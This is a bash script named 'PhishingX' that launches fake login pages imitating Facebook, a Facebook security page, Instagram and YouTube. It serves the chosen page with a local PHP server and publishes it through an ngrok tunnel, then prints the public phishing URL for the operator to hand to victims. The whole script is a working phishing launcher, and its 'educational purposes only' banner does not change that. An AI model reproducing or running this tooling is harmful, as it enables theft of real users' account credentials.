#!/bin/bash

# Display tool name with figlet and lolcat
figlet -c -f slant "PhishingX" | lolcat
echo "Author: DeadXFire" | lolcat
# Display warning message and your name
echo -e "\033[31mWARNING: This tool is for educational purposes only.\033[0m"

echo "Unauthorized use is illegal and unethical." | lolcat

echo

# Prompt for ngrok auth token
read -p "Enter your ngrok auth token: " NGROK_AUTH_TOKEN

# Configure ngrok with the provided auth token
ngrok authtoken $NGROK_AUTH_TOKEN
if [ $? -ne 0 ]; then
    echo "Error: Invalid ngrok auth token or failed to configure ngrok" | lolcat
    exit 1
fi

# Display options for phishing pages
echo "Select a service to start phishing:"
echo "1. Facebook"
echo "2. Facebook Security Page"
echo "3. Instagram"
echo "4. YouTube"
read -p "Enter your choice: " choice

case $choice in
    1)
        page="facebook.php"
        ;;
    2)
        page="facebooksecurity.php"
        ;;
    3)
        page="instagram.php"
        ;;
    4)
        page="youtube.php"
        ;;
    *)
        echo "Invalid choice"
        exit 1
        ;;
esac

# Navigate to the pages directory
cd pages || { echo "Error: Could not change directory to 'pages'"; exit 1; }

# Start PHP server and serve the selected page
php -S localhost:8080 & 
php_server_pid=$!
sleep 2

# Start ngrok tunnel in the background and suppress its web interface
ngrok http 8080 > /dev/null &
ngrok_pid=$!
sleep 5

# Capture ngrok URL
ngrok_url=$(curl --silent --show-error http://localhost:4040/api/tunnels | jq -r .tunnels[0].public_url)

if [[ $ngrok_url == null || -z $ngrok_url ]]; then
    echo "Error: Could not retrieve ngrok URL" | lolcat
    kill $php_server_pid $ngrok_pid
    exit 1
fi

# Output ngrok URL
echo "Ngrok URL: $ngrok_url" | lolcat
echo "You can access the phishing page at: $ngrok_url/$page" | lolcat

# Trap for cleanup on exit
trap "kill $php_server_pid $ngrok_pid; exit" SIGINT SIGTERM

# Keep the script running to prevent ngrok from stopping
while true; do
    sleep 3600
done
